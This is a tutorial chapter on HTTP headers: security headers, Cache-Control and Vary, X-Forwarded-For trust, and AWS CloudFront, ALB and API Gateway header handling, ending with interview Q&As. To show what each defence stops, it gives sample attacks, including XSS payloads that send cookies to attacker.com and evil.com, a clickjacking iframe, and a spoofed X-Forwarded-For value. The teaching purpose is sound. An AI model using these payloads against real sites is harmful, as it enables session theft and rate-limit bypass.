# HTTP Headers — Part 2 of 3

### Topic: HTTP Headers in Production Systems and AWS

**Series:** Networking Fundamentals → System Design → AWS Solutions Architect
**Sections Covered:** 5, 6, 7, 8

---

## SECTION 5 — Real World Examples

### Analogy 1 — The Bank Teller's Checklist

Before a bank teller hands you $10,000 in cash, they require specific documentation. They don't read your request letter — they scan the metadata:

- Valid government ID present? (`Authorization` header)
- Correct account number provided? (`Host` header for routing)
- Transaction form filled correctly? (`Content-Type` header validates format)
- Large cash transaction notification required? (`X-Risk-Flag: high-value`)

If you show up with valid credentials but ask for something you don't have permission to access, the teller doesn't debate the content of your withdrawal slip. The header metadata fails first. This is exactly how middleware, load balancers, and API gateways work — they read headers and make routing/rejection decisions BEFORE the body reaches your application code.

### Analogy 2 — The Airport Check-In Counter

At check-in, the agent processes:

- Your passport (`Authorization` / identity headers)
- Destination (`Host`, `Referer` — where are you going, where did you come from)
- Bag size tag (Content-Length)
- Checked baggage label ("fragile") (Content-Encoding, Content-Type)
- Boarding pass issued (Session cookie via Set-Cookie)
- "SSSS" security flag added (`X-Security-Flag`, like WAF headers)
- Lounge access card (`Cache-Control: private` — you get special access, CDN can't share your response)

The cargo hold (body) doesn't get inspected at the counter. All decisions are made from the boarding pass and passport metadata. Your seat assignment (Location), boarding group (priority headers), and security checks all happen from envelope data alone.

### Real Software Example — Security Headers in Production

Mozilla Observatory scores websites 0-100 on security header implementation. Here's what a production-grade security header setup looks like and why each was added:

```
Real-world security incident that each header prevents:

INCIDENT 1 — XSS via injected script tag (solved by CSP):
  Attacker exploited user-generated content (forum post) to inject:
  <script src="https://attacker.com/steal-cookies.js"></script>

  Without CSP: browser loads attacker script, steals session cookies
  With CSP: Content-Security-Policy: script-src 'self' cdn.shop.com
  → Browser refuses to load attacker.com script
  → XSS attack defeated by header alone

INCIDENT 2 — Clickjacking (solved by X-Frame-Options or CSP frame-ancestors):
  Attacker's site: <iframe src="https://bank.com/transfer" style="opacity:0.001">
  Invisible iframe overlaid over "WIN A PRIZE" button
  User "clicking prize" actually submitting bank transfer

  Without X-Frame-Options: bank.com loads in iframe
  With X-Frame-Options: DENY → browser refuses to render bank.com in any iframe

INCIDENT 3 — HTTP downgrade attack (solved by HSTS):
  User on public WiFi: types bank.com in browser
  Before HTTPS, attacker intercepts HTTP request, responds with fake HTTP site
  User never sees HTTPS — user logs in on attacker-controlled page

  Without HSTS: browser happily uses HTTP on first connection
  With HSTS (once visited BEFORE): browser auto-upgrades to HTTPS
  max-age=31536000 = browser remembers for 1 year
  → Attacker cannot intercept — browser forces HTTPS before any TCP connection

INCIDENT 4 — MIME sniffing attack (solved by X-Content-Type-Options):
  Attacker uploads profile picture "photo.jpg" that contains JavaScript
  Server serves it as image/jpeg
  Old browsers "sniff" the content → detect JS patterns → execute as script

  With X-Content-Type-Options: nosniff → browser trusts Content-Type, never sniffs
  → Even if file contains JS, browser renders it as broken image (correct behavior)

Full security header implementation for a production API:
  Strict-Transport-Security: max-age=31536000; includeSubDomains
  Content-Security-Policy: default-src 'none'; connect-src 'self'; frame-ancestors 'none'
  X-Content-Type-Options: nosniff
  Referrer-Policy: no-referrer
  Cache-Control: no-store (for authenticated API responses)
  Permissions-Policy: geolocation=(), camera=(), microphone=()

  NOT setting:
  X-Frame-Options: DENY (CSP frame-ancestors replaces this; don't set both, CSP wins)
  X-XSS-Protection: 1 (deprecated; CSP replaces this; setting it can cause issues in newer browsers)
```

---

## SECTION 6 — System Design Importance

### 1. Headers Are the Primary I/O Surface for Infrastructure Components

Every infrastructure component between the client and your code reads and writes headers:

```
CLIENT → ALB → WAF → CloudFront → API Gateway → Lambda

At each stage, headers are READ for routing and WRITTEN for context:

ALB adds:
  X-Forwarded-For: 1.2.3.4                 (original client IP)
  X-Forwarded-Proto: https                  (original protocol)
  X-Forwarded-Port: 443                     (original port)

WAF adds (if configured):
  X-AMZ-WAF-ACRID: ...                     (WAF ACL ID, for debugging)

CloudFront adds:
  X-Forwarded-For: <edge-node-IP>           (extends the existing X-Forwarded-For)
  CloudFront-Viewer-Country: US             (geo-IP detection)
  CloudFront-Is-Mobile-Viewer: true/false   (device type)
  CloudFront-Viewer-Address: 1.2.3.4:54321  (viewer IP and port)

API Gateway adds:
  X-Amzn-RequestId: uuid                   (for tracing in CloudWatch logs)
  X-Amzn-Trace-Id: Root=1-xxx;Sampled=1   (X-Ray trace)

Your application should:
  Read X-Forwarded-For for real client IP (not req.socket.remoteAddress which = ALB IP)
  Read X-Amzn-Trace-Id, propagate to downstream calls
  Write X-Request-ID on all responses (correlate with your own logs)
```

### 2. Caching Architecture via Cache-Control Directives

The `Cache-Control` header is the most architecturally important response header. It is the CONTRACT between your server and every cache in the path:

```
Public API endpoint (product catalog):
  Cache-Control: max-age=3600, public, stale-while-revalidate=60

  Meaning:
    max-age=3600      → Fresh for 60 minutes (browser AND CDN cache)
    public            → CDN (CloudFront) MAY cache this (safe to store in shared cache)
    stale-while-revalidate=60 → After expiry, serve stale content for up to 60s
                               while fetching fresh copy in background

  Benefit: User never sees empty page. During the 60s revalidate window,
  they get instant response from cache. No one waits for origin.

Authenticated user data (shopping cart, profile):
  Cache-Control: private, max-age=300

  Meaning:
    private → ONLY the user's browser may cache (CDN must forward to origin)
    max-age=300 → 5 minutes in browser cache is fine

  Benefit: Cart loads fast locally; security: CDN not caching Alice's cart for Bob

Financial / real-time data (account balance):
  Cache-Control: no-store

  Meaning: NEVER store a copy anywhere (no browser cache, no CDN cache)

  Why "no-store" not "no-cache":
    no-cache = "you can store it, but check with me before using it"
    no-store = "don't store it at all, ever"

  For credit card numbers, passwords, account balances: always no-store

Static assets (images, JS bundles with hash):
  Cache-Control: max-age=31536000, immutable

  Meaning:
    max-age=31536000 → Fresh for 1 year
    immutable        → I PROMISE this content will NEVER change at this URL
                       Browser skips revalidation entirely (no If-None-Match request)

  Pattern: always use content-hashed filenames (main.abc123.js)
  When you change the file, you change the hash, URL changes → cache busted naturally
  Old URL holds immutable old version forever in cache (fine, it's outdated URL)
```

### 3. Vary Header and Cache Fragmentation

The `Vary` header tells caches which request headers affect the response. This is critical to get right or you'll have unexpected cache behaviours:

```
GET /index.html
Accept-Encoding: gzip

Server returns:
  Content-Encoding: gzip
  Vary: Accept-Encoding

Cache stores: key = "GET /index.html" + "Accept-Encoding: gzip"

Next request:
GET /index.html
Accept-Encoding: identity (no compression)

Cache asks: Do I have "GET /index.html" + "Accept-Encoding: identity"?
Answer: No → Cache MISS → forward to origin
```

**Vary: \* is a cache killer:**

```
Vary: *
Meaning: Every request is unique — do NOT use cache at all
Effect: CloudFront bypasses cache entirely for this URL

This is fine for authenticated, personalized responses (and similar to Cache-Control: private)
This is TERRIBLE for public API responses → every user hits origin
```

**Common Vary mistake — fragmentation:**

```
Vary: User-Agent   ← CATASTROPHIC

There are thousands of unique User-Agent strings.
Cache would store separate copy for Chrome/120, Chrome/121, Safari, Firefox, bots...
Cache hit rate: ~0% (every browser version = distinct cache key)

Correct: Never Vary by User-Agent. Use client hints or feature detection in JS.
```

### 4. X-Forwarded-For Chain and IP Trust

Understanding `X-Forwarded-For` is critical for rate limiting and geolocation:

```
Real request path:
  Client (1.2.3.4) → CloudFront (54.1.2.3) → ALB (10.0.1.5) → App

X-Forwarded-For values at each stage:
  CloudFront receives from client, starts chain:
    X-Forwarded-For: 1.2.3.4

  ALB extends the chain:
    X-Forwarded-For: 1.2.3.4, 54.1.2.3

  Your application sees:
    X-Forwarded-For: 1.2.3.4, 54.1.2.3
    Real client IP = FIRST value (leftmost): 1.2.3.4

Security trap — never trust X-Forwarded-For blindly:
  Attacker sends: X-Forwarded-For: 127.0.0.1
  ALB appends actual IP: X-Forwarded-For: 127.0.0.1, 1.2.3.4
  Your app reads FIRST value = 127.0.0.1 = "localhost" → bypasses IP-based rate limiting!

  Safe approach: Read the LAST value that your known infrastructure added.
  If you control ALB as the final proxy:
    Safe IP = X-Forwarded-For header's LAST value (added by ALB, cannot be spoofed by client)
```

---

## SECTION 7 — AWS Mapping

### CloudFront Custom Headers

Two directions: custom headers TO origin, and response headers policy TO viewers:

```
1. Custom headers from CloudFront to origin (secret auth):

   Use case: Protect origin ALB from direct public access.
   Only CloudFront should be able to call the origin.

   CloudFront behavior config:
     Origin Request Headers:
       X-CloudFront-Auth: "my-secret-value-12345"

   ALB listener rule:
     IF header X-CloudFront-Auth = "my-secret-value-12345" THEN forward
     ELSE return 403

   Result: Direct calls to alb.shop.com/path → 403 (no secret header)
           Via CloudFront only → reaches origin

   Rotate the secret periodically; use AWS Secrets Manager to store + auto-rotate

2. CloudFront response headers policy (to viewers):

   Managed policies available (no code needed):
     SecurityHeadersPolicy → Adds HSTS, CSP, X-Content-Type-Options, etc.
     CORSWithDefaultOrigin → Adds CORS headers
     SimpleCORS → Adds Access-Control-Allow-Origin: *

   Custom policy example:
     Add: X-Frame-Options: DENY
     Add: Strict-Transport-Security: max-age=31536000
     Add: X-Cache: Hit/Miss from cloudfront (debugging)
```

### ALB X-Forwarded Headers + Routing by Header

```
ALB automatically adds:
  X-Forwarded-For: <client-ip>
  X-Forwarded-Proto: https (or http)
  X-Forwarded-Port: 443

ALB listener rule: route by header value:
  IF http-header(X-API-Version) = "v2" THEN forward to target-group-v2
  IF http-header(X-API-Version) = "v1" THEN forward to target-group-v1
  ELSE forward to target-group-default

ALB listener rule: route by host header (virtual hosting):
  IF host-header = "api.shop.com" THEN forward to api-targets
  IF host-header = "admin.shop.com" THEN forward to admin-targets
  IF host-header = "cdn.shop.com" THEN forward to cdn-targets

ALB sticky sessions via cookie:
  When enabled, ALB sets AWSALB cookie on first response:
  Set-Cookie: AWSALB=H4sI...; Expires=Sat,30 Mar 2024 14:00:00 GMT; Path=/; SameSite=None; Secure
  AWSALBCORS=H4sI...; ... (second cookie required for CORS requests)
  Note: Sticky sessions cause uneven load distribution — prefer stateless design
```

### API Gateway Header Transformation

```
API Gateway REST API: header mapping in Integration Request
  Map incoming headers to backend form:
    method.request.header.Authorization → integration.request.header.X-Lambda-Auth

  Map backend response headers to API response:
    Note: Response headers from Lambda are only forwarded if listed in
          "HTTP Integration Response" header mappings

API Gateway: CORS headers via gateway configuration
  Enable CORS on resource → Gateway auto-adds:
    Access-Control-Allow-Origin: *  (or configured origin)
    Access-Control-Allow-Headers: Content-Type,X-Amz-Date,Authorization,X-Api-Key
    Access-Control-Allow-Methods: GET,POST,OPTIONS

  IMPORTANT: Must deploy the API after enabling CORS or headers won't appear
  (Very common: "I turned on CORS but still getting errors" = forgot to redeploy)

API Gateway JWT Authorizer (HTTP API):
  Reads: Authorization header
  Validates: JWT signature using JWKS endpoint (e.g., Cognito User Pool)
  On failure: 401 with WWW-Authenticate header
  On success: passes $context.authorizer.claims to Lambda
```

### CloudWatch Header-Based Metrics

```
ALB Access Logs capture all headers (useful for security analysis):
  Log field: "request_headers" contains all forwarded headers

  Athena query on ALB logs:
  SELECT COUNT(*) as requests, client_ip
  FROM alb_logs
  WHERE user_agent LIKE '%python-requests%'
    AND time BETWEEN '2026-02-23T14:00' AND '2026-02-23T15:00'
  GROUP BY client_ip
  ORDER BY requests DESC
  -- Finds Python bot/scraper IPs for WAF blocking

CloudFront access logs include:
  cs-uri-query: query string
  cs(Referer): Referer header value
  cs(User-Agent): User-Agent value
  cs(X-Forwarded-For): XFF header from viewer
```

---

## SECTION 8 — Interview Q&As

### Beginner Questions

**Q1: What is the difference between Cache-Control: no-cache and no-store?**

A: Despite similar-sounding names, they have meaningfully different effects:

`Cache-Control: no-cache` means: "You MAY cache this response, but you MUST revalidate with the server every time before using it." The cache stores a copy but checks with the origin (via `If-None-Match` or `If-Modified-Since`) on every use. If the server confirms it's still valid, the cache returns its stored copy (saving bandwidth). If changed, it downloads fresh. "No cache USE without checking" not "no caching."

`Cache-Control: no-store` means: "Do not store this anywhere, ever." No disk write, no memory store, nothing. Every request goes directly to origin. Use this for sensitive data: bank balances, auth tokens, health records.

Real-world decision:

- API response for current stock price: `no-cache` (CDN stores it but always validates = fast miss if unchanged, fresh if changed)
- User's bank statement page: `no-store` (never store — security requirement, no exceptions)
- User profile (changes rarely): `private, max-age=300` (browser caches 5 min; CDN doesn't cache)

**Q2: Why does the Vary header matter for CDN caching?**

A: The `Vary` header tells a CDN which request headers affect the response content. The CDN uses the combination of `[URL + Vary header values]` as its cache key.

Practical example: Your API supports gzip and Brotli compression. Without `Vary: Accept-Encoding`, the CDN caches the first response (say, gzip) and serves it to ALL clients, including those that sent `Accept-Encoding: br`. The Brotli client would receive a gzip-encoded response without knowing it, causing decompression failures.

With `Vary: Accept-Encoding`, the CDN stores TWO cache entries:

1. Key: `GET /products + Accept-Encoding: gzip` → gzip-compressed response
2. Key: `GET /products + Accept-Encoding: br` → Brotli-compressed response

Now each client gets the right compressed version. The trade-off is storing more cache entries. CloudFront handles `Vary: Accept-Encoding` specially — it doesn't actually fragment the cache, it stores one compressed copy and can decompress for clients that don't support it.

**Q3: What is the purpose of the Content-Type header and what happens if it's wrong?**

A: `Content-Type` tells the recipient what format the body is in, so they know how to parse it:

- `application/json` → parse as JSON
- `text/html` → render as HTML
- `multipart/form-data` → parse as form fields and file uploads
- `application/octet-stream` → treat as binary blob (generic download)

If Content-Type is wrong or missing, unpredictable things happen:

Missing from request: Server may reject with 415 Unsupported Media Type (Spring Boot) or default to form encoding. Most APIs require `Content-Type: application/json` for JSON bodies.

Wrong Content-Type: Frontend sends `Content-Type: application/json` but sends form-encoded data → server tries to JSON-parse form data → 400 Bad Request (JSON parse error).

Missing from response: Browser tries to "sniff" the content type. It might render a JSON file as text, or (without `X-Content-Type-Options: nosniff`) interpret an uploaded image containing JavaScript as a script.

Production rule: ALWAYS set Content-Type explicitly on both requests and responses. Never rely on defaults.

### Intermediate Questions

**Q4: How do security headers work together to prevent XSS attacks? Walk through a scenario.**

A: Defense-in-depth: each header catches a different attack vector:

Scenario: Your product review system has an XSS vulnerability. An attacker submits a review containing `<script>fetch('https://evil.com/steal?c='+document.cookie)</script>`. The review gets stored and displayed to other users.

Without security headers: When victim visits the page, their browser executes the injected script. It reads `document.cookie` and sends session cookie to attacker.com. Attacker now has a valid session cookie and is logged in as the victim.

With `HttpOnly` on the session cookie: `document.cookie` returns an empty string for HttpOnly cookies. JavaScript cannot read the session cookie even if the script runs. Attack reduced: attacker can't steal the session token.

With `Content-Security-Policy: script-src 'self'`: The browser refuses to run inline `<script>` tags (unless `'unsafe-inline'` is in CSP). The injected script tag is blocked before executing. Attack prevented entirely.

With `X-Content-Type-Options: nosniff`: If the attacker uploaded a file that contains JavaScript disguised as an image, the browser will not "sniff" the content type and execute it. It trusts `image/jpeg` header and renders it as a broken image.

Combined: CSP prevents script execution, HttpOnly limits damage if CSP is bypassed, nosniff closes the file-upload vector. True defense-in-depth — each header addresses a different attack scenario.

**Q5: You're building an API that multiple frontend apps consume from different origins. How do you set CORS headers correctly?**

A: CORS requires careful implementation to be both secure and functional:

```javascript
// Express.js CORS middleware implementation

app.use((req, res, next) => {
  const allowedOrigins = [
    "https://shop.com",
    "https://admin.shop.com",
    "https://app.shop.com",
  ];

  const origin = req.headers.origin;

  if (allowedOrigins.includes(origin)) {
    // Reflect the specific origin back (not Access-Control-Allow-Origin: *)
    // because we use credentials (cookies)
    res.setHeader("Access-Control-Allow-Origin", origin);
    res.setHeader("Vary", "Origin"); // CRITICAL: tell CDN to cache separately per origin
  }

  res.setHeader("Access-Control-Allow-Credentials", "true");
  res.setHeader("Access-Control-Expose-Headers", "X-Request-ID, Location");

  // Handle preflight
  if (req.method === "OPTIONS") {
    res.setHeader(
      "Access-Control-Allow-Methods",
      "GET, POST, PUT, PATCH, DELETE",
    );
    res.setHeader(
      "Access-Control-Allow-Headers",
      "Content-Type, Authorization, X-Request-ID",
    );
    res.setHeader("Access-Control-Max-Age", "86400"); // Cache preflight for 24h
    return res.sendStatus(204);
  }

  next();
});
```

Key points:

1. When using `Access-Control-Allow-Credentials: true`, you MUST specify exact origin (not `*`)
2. `Vary: Origin` is critical — CDN must cache separate responses per origin (or all origins get the same origin header)
3. `Access-Control-Max-Age` reduces preflight count (browser caches the permission for 24h)
4. `Access-Control-Expose-Headers` explicitly lists non-simple headers the client JS can read

**Q6: How should distributed tracing headers be propagated in a microservices architecture?**

A: Correlation IDs in headers are the primary mechanism for end-to-end request tracing:

Design:

1. API Gateway or ALB generates a unique `X-Request-ID` (UUID) on each incoming request
2. Every service reads this header and includes it in ALL outbound calls to other services
3. Every service includes `X-Request-ID` in its log lines
4. When debugging, start from the ALB log using `X-Request-ID`, then query all service logs with that ID

```
Incoming request → X-Request-ID: 7f3d9a12
  order-service logs: [7f3d9a12] Received POST /orders
  order-service calls inventory-service with X-Request-ID: 7f3d9a12
    inventory-service logs: [7f3d9a12] Reserve stock for product 42
  order-service calls payment-service with X-Request-ID: 7f3d9a12
    payment-service logs: [7f3d9a12] Processing $29.99
    payment-service calls Stripe with X-Idempotency-Key: 7f3d9a12
  order-service logs: [7f3d9a12] Order 789 confirmed

CloudWatch Logs query:
  fields @timestamp, @message
  | filter @message like "7f3d9a12"
  | sort @timestamp asc
  → Returns EVERY log line across ALL services for this one request, in order
```

AWS X-Ray uses `X-Amzn-Trace-Id` similarly. Include both `X-Request-ID` (your custom ID, echo back to clients) and `X-Amzn-Trace-Id` (AWS infrastructure tracing) in all logs.

### Advanced System Design Questions

**Q7: Your API has performance issues. Response time is high. A teammate suggests "just add caching." How do you design a caching strategy using headers?**

A: Headers-based caching strategy requires analyzing endpoint by endpoint:

**Step 1: Categorize endpoints**

```
Public static (no user data):
  GET /products/{id}     → Can CDN cache? YES
  GET /categories        → Can CDN cache? YES (changes rarely)
  GET /search?q=shirt    → Can CDN cache? Maybe (popular queries, short TTL)

Public dynamic (user data):
  GET /cart              → Can CDN cache? NO (user-specific)
  GET /orders            → Can CDN cache? NO (user-specific + sensitive)

Write operations:
  POST/PUT/PATCH/DELETE  → Never cached (POST to CDN = anti-pattern)
```

**Step 2: Set appropriate Cache-Control per category**

```javascript
// Public product catalog (changes daily)
res.setHeader(
  "Cache-Control",
  "max-age=3600, s-maxage=86400, public, stale-while-revalidate=300",
);
// max-age=3600: browser caches 1h
// s-maxage=86400: CDN caches 24h (overrides max-age for CDN)
// stale-while-revalidate=300: serve stale for 5 min while refreshing

// User-specific data
res.setHeader("Cache-Control", "private, max-age=60");
// Only browser, not CDN; 60s cached locally

// Static assets (hashed filenames)
res.setHeader("Cache-Control", "max-age=31536000, immutable");
res.setHeader("ETag", computeHash(fileContent));

// Real-time / auth pages
res.setHeader("Cache-Control", "no-store");
```

**Step 3: Add ETag/Last-Modified for conditional requests**
Even when cache expires, conditional GET saves bandwidth if content is unchanged. At 10K req/sec on a 100KB JSON response, 304 responses (zero-body) vs 200 responses (100KB) = 1GB/sec bandwidth difference.

**Step 4: CDN configuration**
CloudFront: set custom Cache Behaviour for each path pattern. Don't forward `Cookie` header for public endpoints (forwarding cookies disables CDN caching).

**Q8: An internal security audit finds that your API responses contain server version headers (Server: Apache/2.4.18). You're asked to remove them. How does this relate to HTTP headers security, and what else would you fix?**

A: The `Server` header leaks implementation details — Apache version = known vulnerability catalog entry. An attacker knowing "Apache 2.4.18" can immediately reference CVE database for that version's known exploits.

Remove it:

```nginx
# nginx: remove Server header
server_tokens off;

# Apache: suppress version
ServerTokens Prod
ServerSignature Off

# Express.js: remove X-Powered-By
app.disable('x-powered-by')
```

While you're doing a header security audit, here's the complete checklist:

**Remove (information disclosure):**

- `Server: Apache/2.4.18` → remove or set to generic: `Server: myapp`
- `X-Powered-By: Express` → remove entirely
- `X-AspNet-Version: 4.0` → remove entirely

**Add (security enforcement):**

```
Strict-Transport-Security: max-age=31536000             (HTTPS enforcement)
Referrer-Policy: strict-origin-when-cross-origin        (limit referrer info)
X-Content-Type-Options: nosniff                         (MIME sniffing prevention)
X-Frame-Options: DENY   OR  CSP frame-ancestors 'none'  (clickjacking)
Content-Security-Policy: [detailed policy]              (XSS mitigation)
Permissions-Policy: geolocation=(), camera=()           (browser feature restriction)
```

**Check for accidental leakage:**

- Authorization headers in responses (accidentally echoing auth headers back)
- Internal IP addresses in `Location` headers (`http://10.0.1.5/orders/789` should be relative or use public hostname)
- Stack trace details in error bodies (related to headers — debug headers sometimes dump trace context)
- Cookies without `HttpOnly; Secure; SameSite=Strict`

---

## File Summary

This file covered:

- Bank teller + airport check-in analogies (headers = metadata for infrastructure decisions, body = cargo not inspected at gates)
- Security headers real-world incidents: XSS prevented by CSP, clickjacking prevented by X-Frame-Options, HSTS prevents HTTP downgrade, nosniff prevents MIME type confusion attacks
- Infrastructure header additions: ALB (X-Forwarded-For/Proto/Port), CloudFront (Viewer-Country, Is-Mobile), API Gateway (X-Amzn-RequestId, X-Amzn-Trace-Id)
- Cache-Control directives by endpoint type: immutable for static, max-age+s-maxage for CDN, private for user data, no-store for sensitive
- Vary header and cache fragmentation: Vary: \* kills CDN caching; Vary: User-Agent = catastrophic; Vary: Accept-Encoding = correct
- X-Forwarded-For chain: leftmost = original client; rightmost = last trusted proxy; NEVER trust first value blindly
- AWS: CloudFront custom headers for origin auth, response header policies, ALB header routing and sticky sessions, API Gateway CORS/JWT headers
- 8 Q&As: no-cache vs no-store, Vary header CDN impact, Content-Type wrong effects, XSS defense-in-depth, CORS multi-origin implementation, distributed tracing headers, caching strategy design, removing information-disclosure headers

**Continue to File 03** for AWS SAA certification traps, 5 comparison tables, Quick Revision mnemonics, and Architect Exercise: CSP deployment disaster.
